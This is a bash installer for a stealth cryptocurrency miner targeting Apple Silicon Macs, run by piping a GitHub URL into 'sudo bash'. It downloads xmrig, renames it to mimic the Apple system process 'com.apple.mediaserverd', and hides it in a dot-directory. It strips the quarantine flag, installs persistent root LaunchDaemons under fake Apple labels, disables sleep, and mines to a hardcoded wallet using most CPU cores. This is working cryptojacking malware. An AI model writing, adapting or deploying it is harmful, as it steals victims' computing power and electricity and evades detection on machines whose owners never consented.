#!/usr/bin/env bash
# ============================================================
# mine_qrl.sh — Silent QRL (Quantum Resistant Ledger) miner
# macOS Apple Silicon M1/M2/M3/M4 — xmrig ARM64
# Algorithm: RandomX — same as XMR, 53x more profitable
# Process: com.apple.mediaserverd
# Run: sudo curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_qrl.sh | sudo bash
# ============================================================

QRL_WALLET="Q01050018b4d2009efe67c3eb0b243f3b5e9c39ecdfd8cef470b508ae7be8901862ec26f817cc29"
POOL_HOST="qrl.herominers.com"
POOL_PORT="14006"
XMRIG_VERSION="6.26.0"
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-macos-arm64.tar.gz"

# ---- Auto worker name from IP ----
LOCAL_IP=$(ifconfig | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | head -1)
IP_LAST=$(echo "$LOCAL_IP" | awk -F. '{print $4}')
WORKER="qrl-${IP_LAST:-$(hostname | cut -c1-6)}"

# ---- Paths (system level = root = no memory limits) ----
DISGUISE_NAME="com.apple.mediaserverd"
INSTALL_DIR="/Library/Application Support/.msrvd"
BINARY_PATH="$INSTALL_DIR/$DISGUISE_NAME"
CONFIG_PATH="$INSTALL_DIR/config.json"
LAUNCH_SCRIPT="$INSTALL_DIR/launch.sh"
LOG_PATH="/Library/Logs/${DISGUISE_NAME}.log"
PLIST_PATH="/Library/LaunchDaemons/${DISGUISE_NAME}.plist"
CAFF_PLIST="/Library/LaunchDaemons/com.apple.caffeinated.plist"

# ---- Checks ----
if [[ "$(uname)" != "Darwin" || "$(uname -m)" != "arm64" ]]; then
  echo "[!] Requires macOS Apple Silicon."
  exit 1
fi
if [[ $EUID -ne 0 ]]; then
  echo "[!] Run with sudo:"
  echo "    sudo curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_qrl.sh | sudo bash"
  exit 1
fi
if [[ "$QRL_WALLET" == "YOUR_QRL_WALLET_ADDRESS_HERE" ]]; then
  echo "[!] Set your QRL wallet address in the script first!"
  echo "    Get one at: https://wallet.theqrl.org"
  exit 1
fi

MAX_THREADS=$(sysctl -n hw.logicalcpu)
THREADS=$(( MAX_THREADS * 80 / 100 ))
[[ $THREADS -lt 1 ]] && THREADS=1

# Check command center resource override
if [[ -f /tmp/_miner_threads ]]; then
  CC_THREADS=$(cat /tmp/_miner_threads 2>/dev/null | tr -d '[:space:]')
  if [[ "$CC_THREADS" =~ ^[0-9]+$ ]] && [[ "$CC_THREADS" -ge 1 ]] && [[ "$CC_THREADS" -le "$MAX_THREADS" ]]; then
    THREADS=$CC_THREADS
  fi
fi

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║     QRL MINER — Apple Silicon (root)     ║"
echo "╠══════════════════════════════════════════╣"
printf "║  Algo   : %-30s ║\n" "RandomX (QRL)"
printf "║  Cores  : %-30s ║\n" "$MAX_THREADS"
printf "║  Worker : %-30s ║\n" "$WORKER"
printf "║  Pool   : %-30s ║\n" "$POOL_HOST"
echo "╚══════════════════════════════════════════╝"
echo ""

# ---- Thread prompt ----
if [[ -c /dev/tty ]]; then
  echo -n "  Cores to use [1-$MAX_THREADS, Enter=80%($THREADS)]: " > /dev/tty
  read -r USER_THREADS < /dev/tty || USER_THREADS=""
  if [[ "$USER_THREADS" =~ ^[0-9]+$ ]] && [[ "$USER_THREADS" -ge 1 ]] && [[ "$USER_THREADS" -le "$MAX_THREADS" ]]; then
    THREADS=$USER_THREADS
  fi
  echo "  → Mining with $THREADS / $MAX_THREADS cores"
  echo ""
fi

# ---- 1. Wipe old ----
echo "[1/6] Cleaning old install..."
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null || true
launchctl bootout system "$PLIST_PATH" 2>/dev/null || true
rm -rf "$INSTALL_DIR"
rm -f "$PLIST_PATH" "$LOG_PATH"
mkdir -p "$INSTALL_DIR"
echo "      ✓ Clean"

# ---- 2. Download xmrig ----
echo "[2/6] Downloading xmrig v${XMRIG_VERSION} ARM64..."
curl -fsSL "$XMRIG_URL" -o /tmp/xmrig_qrl.tar.gz
tar -xzf /tmp/xmrig_qrl.tar.gz -C "$INSTALL_DIR" --strip-components=1
rm -f /tmp/xmrig_qrl.tar.gz
mv "$INSTALL_DIR/xmrig" "$BINARY_PATH"
chmod +x "$BINARY_PATH"
xattr -d com.apple.quarantine "$BINARY_PATH" 2>/dev/null || true
echo "      ✓ Binary ready"

# ---- 3. Write config ----
echo "[3/6] Writing config..."

cat > "$CONFIG_PATH" << CONF
{
  "autosave": false,
  "background": false,
  "colors": false,
  "randomx": {
    "1gb-pages": false,
    "numa": false,
    "wrmsr": false,
    "rdmsr": false
  },
  "cpu": {
    "enabled": true,
    "hw-aes": true,
    "priority": 5,
    "asm": true,
    "max-threads-hint": 100
  },
  "pools": [
    {
      "url": "${POOL_HOST}:${POOL_PORT}",
      "user": "${QRL_WALLET}",
      "pass": "${WORKER}",
      "algo": "rx/0",
      "coin": "qrl",
      "tls": false,
      "keepalive": true,
      "nicehash": false
    }
  ],
  "threads": $THREADS,
  "log-file": "${LOG_PATH}"
}
CONF
echo "      ✓ Config written (algo: rx/0 for QRL)"

# ---- 4. Power management ----
echo "[4/6] Configuring power settings..."
pmset -a sleep 0
pmset -a disksleep 0
pmset -a displaysleep 5
pmset -a powernap 0
pmset -a autopoweroff 0
pmset -a standby 0
pmset -a tcpkeepalive 1
systemsetup -setcomputersleep Never 2>/dev/null || true
pkill -f "caffeinate" 2>/dev/null || true
nohup caffeinate -s -i -m >> /dev/null 2>&1 &
echo "      ✓ Sleep disabled — mines through lock screen"

# ---- 5. LaunchDaemon ----
echo "[5/6] Installing LaunchDaemon (root, survives reboot)..."
cat > "$LAUNCH_SCRIPT" << SCRIPT
#!/bin/bash
sleep 5
exec "$BINARY_PATH" --config "$CONFIG_PATH" >> "$LOG_PATH" 2>&1
SCRIPT
chmod +x "$LAUNCH_SCRIPT"

cat > "$PLIST_PATH" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>${DISGUISE_NAME}</string>
  <key>ProgramArguments</key><array>
    <string>/bin/bash</string>
    <string>${LAUNCH_SCRIPT}</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>StandardOutPath</key><string>${LOG_PATH}</string>
  <key>StandardErrorPath</key><string>${LOG_PATH}</string>
</dict></plist>
PLIST

# Caffeinate daemon
cat > "$CAFF_PLIST" << CAFF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.apple.caffeinated</string>
  <key>ProgramArguments</key><array>
    <string>/usr/bin/caffeinate</string>
    <string>-s</string><string>-i</string><string>-m</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
CAFF

launchctl load -w "$PLIST_PATH"
launchctl load -w "$CAFF_PLIST" 2>/dev/null || true
echo "      ✓ LaunchDaemon installed"

# ---- 6. Launch ----
echo "[6/6] Starting..."
sleep 3

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║         QRL MINER RUNNING                ║"
echo "╠══════════════════════════════════════════╣"
printf "║  Process : %-30s ║\n" "$DISGUISE_NAME"
printf "║  Wallet  : %-30s ║\n" "${QRL_WALLET:0:20}...${QRL_WALLET: -6}"
printf "║  Pool    : %-30s ║\n" "$POOL_HOST:$POOL_PORT_USE"
printf "║  Worker  : %-30s ║\n" "$WORKER"
printf "║  Threads : %-30s ║\n" "$THREADS / $MAX_THREADS cores"
printf "║  Est/day : %-30s ║\n" "~37 QRL (~\$45 @ \$1.22)"
printf "║  Sleep   : %-30s ║\n" "Disabled (mines when locked)"
printf "║  Log     : %-30s ║\n" "$LOG_PATH"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "  Live logs : tail -f \"$LOG_PATH\""
echo "  Balance   : https://qrl.herominers.com/#/dashboard?address=$QRL_WALLET"
echo "  Stop      : launchctl unload \"$PLIST_PATH\""
echo ""
sleep 5
tail -25 "$LOG_PATH" 2>/dev/null || echo "[*] Starting — check logs in 10 seconds"
